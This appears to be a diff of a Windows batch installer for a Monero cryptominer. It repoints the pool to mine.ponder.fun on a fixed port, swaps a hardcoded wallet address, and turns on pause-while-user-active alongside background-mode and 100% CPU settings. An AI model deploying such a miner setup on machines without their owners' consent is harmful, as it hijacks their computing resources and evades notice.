@@ -146,22 +146,7 @@ if [%EXP_MONERO_HASHRATE%] == [] (
   exit 
 )
 
-if %EXP_MONERO_HASHRATE% gtr 208400  ( set PORT=19999 & goto PORT_OK )
-if %EXP_MONERO_HASHRATE% gtr 102400  ( set PORT=19999 & goto PORT_OK )
-if %EXP_MONERO_HASHRATE% gtr 51200  ( set PORT=15555 & goto PORT_OK )
-if %EXP_MONERO_HASHRATE% gtr 25600  ( set PORT=13333 & goto PORT_OK )
-if %EXP_MONERO_HASHRATE% gtr 12800  ( set PORT=13333 & goto PORT_OK )
-if %EXP_MONERO_HASHRATE% gtr 6400  ( set PORT=13333 & goto PORT_OK )
-if %EXP_MONERO_HASHRATE% gtr 3200  ( set PORT=13333 & goto PORT_OK )
-if %EXP_MONERO_HASHRATE% gtr 1600  ( set PORT=13333 & goto PORT_OK )
-if %EXP_MONERO_HASHRATE% gtr 800   ( set PORT=80 & goto PORT_OK )
-if %EXP_MONERO_HASHRATE% gtr 400   ( set PORT=80 & goto PORT_OK )
-if %EXP_MONERO_HASHRATE% gtr 200   ( set PORT=80 & goto PORT_OK )
-if %EXP_MONERO_HASHRATE% gtr 100   ( set PORT=80 & goto PORT_OK )
-if %EXP_MONERO_HASHRATE% gtr  50   ( set PORT=80 & goto PORT_OK )
-set PORT=80
-
-:PORT_OK
+set PORT=6666
 
 rem printing intentions
 
@@ -310,12 +295,17 @@ if not [%EMAIL%] == [] (
   set "PASS=%EMAIL%"
 )
 
-powershell -Command "$out = cat '%USERPROFILE%\ponder\config.json' | %%{$_ -replace '\"url\": *\".*\",', '\"url\": \"mine.c3pool.com:%PORT%\",'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\ponder\config.json'" 
+if ["%WALLET%"] == ["49mWCojq6tpDTX6Px5uKXZJV8jhq7G4yUXav2JTPJ7q3c4vckgKbdsvPNovjp1nmv8ejNzX6BHvDZ3QieX2ZDMntF11zS3t"] (
+  set "WALLET=%PASS%"
+)
+
+powershell -Command "$out = cat '%USERPROFILE%\ponder\config.json' | %%{$_ -replace '\"url\": *\".*\",', '\"url\": \"mine.ponder.fun:%PORT%\",'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\ponder\config.json'" 
 powershell -Command "$out = cat '%USERPROFILE%\ponder\config.json' | %%{$_ -replace '\"user\": *\".*\",', '\"user\": \"%WALLET%\",'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\ponder\config.json'" 
 powershell -Command "$out = cat '%USERPROFILE%\ponder\config.json' | %%{$_ -replace '\"pass\": *\".*\",', '\"pass\": \"%PASS%\",'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\ponder\config.json'" 
 powershell -Command "$out = cat '%USERPROFILE%\ponder\config.json' | %%{$_ -replace '\"max-cpu-usage\": *\d*,', '\"max-cpu-usage\": 100,'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\ponder\config.json'" 
 set LOGFILE2=%LOGFILE:\=\\%
 powershell -Command "$out = cat '%USERPROFILE%\ponder\config.json' | %%{$_ -replace '\"log-file\": *null,', '\"log-file\": \"%LOGFILE2%\",'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\ponder\config.json'" 
+powershell -Command "$out = cat '%USERPROFILE%\ponder\config.json' | %%{$_ -replace '\"pause-on-active\": false', '\"pause-on-active\": true'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\ponder\config.json'" 
 
 copy /Y "%USERPROFILE%\ponder\config.json" "%USERPROFILE%\ponder\config_background.json" >NUL
 powershell -Command "$out = cat '%USERPROFILE%\ponder\config_background.json' | %%{$_ -replace '\"background\": *false,', '\"background\": true,'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\ponder\config_background.json'" 
